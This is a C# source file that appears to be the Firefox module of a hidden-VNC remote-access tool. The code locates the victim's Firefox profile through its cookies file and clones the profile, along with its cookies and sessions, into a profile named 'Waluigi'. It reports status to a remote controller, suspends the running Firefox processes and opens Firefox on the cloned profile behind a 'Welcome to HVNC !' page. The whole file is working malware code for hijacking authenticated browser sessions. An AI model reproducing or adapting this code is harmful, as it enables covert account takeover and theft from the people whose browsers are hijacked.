using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using DLL.Functions;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;

namespace DLL.Browser
{
    public class Firefox
    {

		[DllImport("user32.dll", EntryPoint = "SetWindowPos")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		const short SWP_NOMOVE = 0X2;
		const short SWP_NOSIZE = 1;
		const short SWP_NOZORDER = 0X4;
		const int SWP_SHOWWINDOW = 0x0040;

		public static void StartFirefox(bool duplicate)
		{
			try
			{
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi\\parent.lock"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Firefox has already been opened!");
					return;
				}
				string path = Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles";
				string text = string.Empty;
				if (!Directory.Exists(path))
				{
					return;
				}
				string[] directories = Directory.GetDirectories(path);
				foreach (string text2 in directories)
				{
					string path2 = text2 + "\\cookies.sqlite";
					if (File.Exists(path2))
					{
						text = Path.GetFileName(text2);
						break;
					}
				}
				if (duplicate)
				{
					Outils.SendInformation(Outils.nstream, "22|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text) / 1024.0 / 1024.0)));
					MonitorDirSize monitorDirSize = new MonitorDirSize();
					monitorDirSize.StartMonitoring(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi");
					try
					{
						Outils.a.FileSystem.CopyDirectory(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text, Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi", overwrite: true);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					monitorDirSize.StopMonitoring();
					Outils.SendInformation(Outils.nstream, "202|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text) / 1024.0 / 1024.0)));
				}
				else
				{
					Outils.SendInformation(Outils.nstream, "203|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\" + text) / 1024.0 / 1024.0)));

				}
				Process[] processesByName = Process.GetProcessesByName("firefox");
				foreach (Process process in processesByName)
				{
					Outils.SuspendProcess(process);
				}
				Process.Start("firefox", "-new-window \"data:text/html,<center><title>Welcome to HVNC !</title><br><br><img src='https://i.imgur.com/A6jEbUB.png'><br><h1><font color='white'>Welcome to HVNC !</font></h1></center>\" -safe-mode -no-remote -profile \"" + Interaction.Environ("appdata") + "\\Mozilla\\Firefox\\Profiles\\Waluigi\"");
				Stopwatch stopwatch = new Stopwatch();
				stopwatch.Start();
				IntPtr intPtr = IntPtr.Zero;
				while (intPtr == IntPtr.Zero)
				{
					// Get the dimensions for the second monitor 
					Rectangle secondMonitor = Screen.AllScreens[0].WorkingArea;
					SetWindowPos(Outils.FindHandle("Firefox Safe Mode"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER | SWP_SHOWWINDOW);

					intPtr = Outils.FindHandle("Firefox Safe Mode");
					if (stopwatch.ElapsedMilliseconds >= 5000)
					{
						break;
					}
				}
				stopwatch.Stop();
				Outils.PostMessage(intPtr, 256u, (IntPtr)13, (IntPtr)1);
				Stopwatch stopwatch2 = new Stopwatch();
				stopwatch2.Start();
				while (Outils.FindHandle("Welcome to HVNC !") == default(IntPtr))
				{
					// Get the dimensions for the second monitor 
					Rectangle secondMonitor = Screen.AllScreens[0].WorkingArea;
					SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, secondMonitor.Left, secondMonitor.Top, secondMonitor.Width, secondMonitor.Height, SWP_NOZORDER | SWP_SHOWWINDOW);


					Application.DoEvents();
					if (stopwatch2.ElapsedMilliseconds >= 5000)
					{
						Process[] processesByName2 = Process.GetProcessesByName("firefox");
						foreach (Process process2 in processesByName2)
						{
							Outils.ResumeProcess(process2);
						}
						break;
					}
				}
				stopwatch2.Stop();
				Process[] processesByName3 = Process.GetProcessesByName("firefox");
				foreach (Process process3 in processesByName3)
				{
					Outils.ResumeProcess(process3);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}

	}
}
